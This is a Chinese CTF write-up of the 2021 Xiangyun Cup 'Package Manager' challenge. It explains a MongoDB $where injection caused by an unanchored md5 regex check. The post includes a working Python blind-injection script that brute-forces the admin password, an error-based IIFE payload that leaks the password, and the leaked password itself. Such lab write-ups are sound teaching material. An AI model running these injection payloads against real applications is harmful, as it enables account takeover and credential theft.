---
title: 2021祥云杯-Package-Manager-2021
date: 2025-12-10 19:48:17
tags:
- mongodb注入
- 布尔盲注
category:
- 刷题笔记
---

# 2021祥云杯-Package-Manager-2021

注册登录之后发现是个包管理的页面，下载源码。

语言是`TypeScript`，基于`javascript`类型拓展的超集，大概语法也和`Node.js`类似。直接打开网页，配合功能点来审计关键点。

**init_db.ts**

```
async function init_db() {
    try {
        await User.deleteMany({})
        console.log('User collection removed')
        let data = { "username": "admin", "password": process.env.ADMIN_PASSWORD, "isAdmin": true }
        const admin = new User(data)
        await admin.save()
        console.log('Successfully create user admin')

        data = { "username": "testuser", "password": process.env.TEST_PASSWORD, "isAdmin": false }
        const testuser = new User(data)
        await testuser.save()
        console.log('Successfully create user testuser')

        const flag = {
            "user_id": admin.id,
            "pack_id": genPackageId(admin.id),
            "name": "Flag is here",
            "description": process.env.FLAG,
            "version": "1.0.1"
        }

```

据源码初始化数据库这一部分，比较显然我们需要登录admin的账号然后admin会有个包里面有flag。

通过`schema.ts`开头可以知道用的是`mongoDB`数据库

**schema.ts**

```
import *  as mongoose from "mongoose"
import * as dotenv from "dotenv";
```

Mongoose 是一个让我们可以通过Node来操作MongoDB数据库的一个模块

然后在index.ts中的/auth路由发现存在mongodb注入漏洞

```
router.get('/auth', (_, res) => res.render('auth'))

router.post('/auth', async (req, res) => {
	let { token } = req.body;
	if (token !== '' && typeof (token) === 'string') {
		if (checkmd5Regex(token)) {
			try {
				//这里存在sql注入漏洞
				let docs = await User.$where(`this.username == "admin" && hex_md5(this.password) == "${token.toString()}"`).exec()
				console.log(docs);
				if (docs.length == 1) {
					if (!(docs[0].isAdmin === true)) {
						return res.render('auth', { error: 'Failed to auth' })
					}
				} else {
					return res.render('auth', { error: 'No matching results' })
				}
			} catch (err) {
				return res.render('auth', { error: err })
			}
		} else {
			return res.render('auth', { error: 'Token must be valid md5 string' })
		}
	} else {
		return res.render('auth', { error: 'Parameters error' })
	}
	req.session.AccessGranted = true
	res.redirect('/packages/submit')
});
```

## 解法一 布尔盲注

`token`要经过`checkmd5Regex`函数的检测，我们跟进查看这个函数

跟进一下`util.ts`文件

```
const checkmd5Regex = (token: string) => {
  return /([a-f\d]{32}|[A-F\d]{32})/.exec(token);
}
```

可以发现，上面是以一个正则匹配大小写和数字一共32位，两种模式的，但是由于没有加`^$`进行语句开头结尾限定，那就说明它只匹配前32位的字母要符合模式就行，后面就能构造任意的语句。

我们构造token:`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[0]=="a`使得括号内的值为

```
this.username == "admin" && hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" || this.password[0]=="a"
```

此时只要或条件成立语句就为真，写个脚本就可以爆出密码啦

```
import requests
import string

url="http://d8ec246d-507e-4aaa-a226-d318473d31ec.node4.buuoj.cn:81/auth"
headers={
    "Cookie": "session=s%3Ay8Ne8sPLeY55QXmWPyh3WmPiuoDgOp6y.U3VuzJCBxWcb5AWW8CCkPJqnSmYJ1N9EnHvoR%2BBuGho",
}

flag = ''
for i in range(10000):
    for j in string.printable:
        if j == '"':
            continue
        payload='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[{}]=="{}'.format(i,j)
        data={
            "_csrf": "YzvJKLZc-4Sp0gfSn-hIRIF4bUZu0nhXy0HU",
            "token": payload
        }
        r=requests.post(url=url,data=data,headers=headers,allow_redirects=False)
        # print(r.text)
        if "Found. Redirecting to" in r.text:
            print(payload)
            flag+=j
            print(flag)
            break
```

---

## 解法二 异常注入

同样的是对auth接口这里逻辑判断，利用了js的抛出异常和IIFE（立即调用函数表达式）来实现

```
token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=>{throw Error(this.password)})()=="admin
```

逻辑判断语句为：`this.username == "admin" && hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=>{throw Error(this.password)})()!="aaaaa"`

这里就是立即执行throw Error(this.password)，后面是!=还是== 字符串的值是什么都无所谓，只要是语法没问题然后语句正常执行，这里强制抛出异常，从源码中可以看到抛出的异常会被渲染出来，然后就能够看到password的值

```
let docs = await User.$where(`this.username == "admin" && hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=>{throw Error(this.password)})()=="admin""`).exec()
console.log(docs);
```

然后报错得到密码：

```
MongoError: Executor error during find command :: caused by :: Error: !@#&@&@efefef*@((@))grgregret3r : @:1:124 @:1:112

# !@#&@&@efefef*@((@))grgregret3r
```

最后登录管理员账号得到flag













